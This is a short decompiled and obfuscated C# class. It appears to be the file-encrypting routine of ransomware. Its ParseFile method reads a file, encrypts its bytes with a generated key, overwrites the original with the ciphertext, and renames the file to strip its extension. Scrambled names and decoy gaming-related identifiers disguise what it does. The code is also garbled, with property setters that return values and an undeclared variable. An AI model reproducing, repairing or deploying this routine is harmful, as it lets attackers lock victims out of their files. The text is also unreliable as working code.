using System;
using System.IO;

namespace jgfjkggkiiy;

internal class fp : ifp
{
	private iep EncryptionProvider;

	private byte[] KeyBytes;

	private string Nameget_Helpset_IsVacBanned
	{
		set
		{
			using FileStream fileStream = File.OpenRead(value);
			byte[] array = new byte[fileStream.Length];
			try
			{
				fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
				fileStream.Close();
				return array;
			}
			finally
			{
				fileStream.Close();
			}
		}
	}

	private byte[] MostPlayedGamesRegisterget_ConnectedTime
	{
		set
		{
			using FileStream fileStream = File.OpenWrite(filePath);
			if (fileStream.CanWrite)
			{
				fileStream.Write(value, 0, Convert.ToInt32(value.Length));
			}
		}
	}

	public fp(iep encryptionProvider)
	{
		EncryptionProvider = encryptionProvider;
		KeyBytes = EncryptionProvider.CreateEncryptionKey();
	}

	public void ParseFile(string filePath)
	{
		int num = 0;
		string extension = default(string);
		byte[] value = default(byte[]);
		byte[] fileBytes = default(byte[]);
		string destFileName = default(string);
		do
		{
			if (num == 4)
			{
				extension = Path.GetExtension(filePath);
				num = 5;
			}
			if (num == 2)
			{
				value = EncryptionProvider.EncryptBytes(fileBytes, KeyBytes);
				num = 3;
			}
			if (num == 1)
			{
				fileBytes = this.set_Nameget_Helpset_IsVacBanned(filePath);
				num = 2;
			}
			if (num == 5)
			{
				destFileName = filePath.Replace(extension, "");
				num = 6;
			}
			if (num == 3)
			{
				this.set_MostPlayedGamesRegisterget_ConnectedTime(filePath, value);
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 6);
		try
		{
			File.Move(filePath, destFileName);
		}
		catch
		{
		}
		GC.Collect();
	}
}
